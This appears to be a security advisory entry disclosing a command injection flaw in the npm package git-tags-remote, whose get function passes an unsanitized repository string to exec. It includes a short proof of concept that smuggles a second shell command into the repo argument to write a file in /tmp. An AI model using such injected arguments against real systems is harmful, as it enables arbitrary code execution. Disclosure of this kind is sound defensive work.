summary: "Command Injection in git-tags-remote\nAll versions of `git-tags-remote ` are vulnerable\
  \ to Command Injection. The package fails to sanitize the repository input and passes it directly\
  \ to an `exec` call on the `get` function . This may allow attackers to execute arbitrary\
  \ code in the system if the `repo` value passed to the function is user-controlled.  \n\n\
  The following proof-of-concept creates a file in `/tmp`:  \n```\nconst gitTagsRemote = require('git-tags-remote');\n\
  \ngitTagsRemote.get('https://github.com/sh0ji/git-tags-remote.git; echo \"Injection Success\"\
  \ > /tmp/command-injection.test')\n.then(tags => console.log(tags));\n```"
